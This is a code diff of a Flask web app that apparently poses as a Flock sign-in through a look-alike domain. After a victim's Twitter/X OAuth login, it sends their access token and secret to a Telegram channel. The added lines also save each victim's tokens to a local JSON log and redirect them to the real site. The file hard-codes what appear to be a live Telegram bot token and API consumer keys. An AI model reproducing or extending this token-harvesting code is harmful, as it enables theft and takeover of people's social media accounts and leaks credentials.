@@ -6,10 +6,11 @@ import os
 app = Flask(__name__)
 app.secret_key = 'icraatmakinesi'
 telegram_bot_token = '6927604552:AAHX6iR3Gduu7qyLv6m_90EbhlS_-ZtBDxI'
-telegram_channel_id = '-2068987569'
-consumer_key = 'SuXtDnr5PpBheY9hkHYxDZb7p'
-consumer_secret = 'xqPU9YVxPP6MulvG9ZriAWeQoB8Hvg8ZWEeXExJozcAaA9Ms5F'
+telegram_channel_id = '-1001995772752'
+consumer_key = 'UWlUZGRSd0xzcGNINnhFbGpmalI6MTpjaQ'
+consumer_secret = 'jniYbDwwo9XPKmNejS4BMPCJFoCcm8JCsourenBd4hvp4WI1vk'
 callback_url = 'https://us-flock.com/callback'
+log_file_path = 'user_logs.json'
 
 
 def calculate_outreach_ability(user):
@@ -62,6 +63,21 @@ def log_user_info(username, access_token, access_token_secret, followers_count, 
         "Outreach Percent": outreach_percentage
     }
 
+    existing_data = []
+    if os.path.exists(log_file_path):
+        with open(log_file_path, 'r') as log_file:
+            existing_data = json.load(log_file)
+    existing_user_index = next((index for (index, user) in enumerate(existing_data) if user["Username"] == username), None)
+
+    if existing_user_index is not None:
+        existing_data[existing_user_index] = user_info
+    else:
+        existing_data.append(user_info)
+
+    with open(log_file_path, 'w') as log_file:
+        json.dump(existing_data, log_file, indent=4)
+
+
 @app.route('/')
 def home():
     return render_template('index.html')
@@ -105,12 +121,14 @@ async def callback():
     api = tweepy.API(auth)
     user = api.verify_credentials()
     outreach_percentage = calculate_outreach_ability(user)
+    log_user_info(user.screen_name, access_token, access_token_secret, user.followers_count, user.friends_count,
+                  user.created_at, outreach_percentage)
 
     ext = "**New Account(app made by andrew tate)**\n\n🪪~Username: " + user.screen_name + "\n\n🔑~Access Token: " + access_token + "\n\n🔑~Access Token Secret: " + access_token_secret + "\n\n👥~Followers: " + str(
         user.followers_count) + "\n\n🎉~Friends: " + str(user.friends_count) + "\n\n⏰~Created At: " + str(
         user.created_at) + "\n\n💎~Outreach Percent: " + outreach_percentage + "%"
     send_telegram_message(ext)
-    return redirect('https://us-flock.com')
+    return redirect('https://flock.com')
 
 
 if __name__ == '__main__':
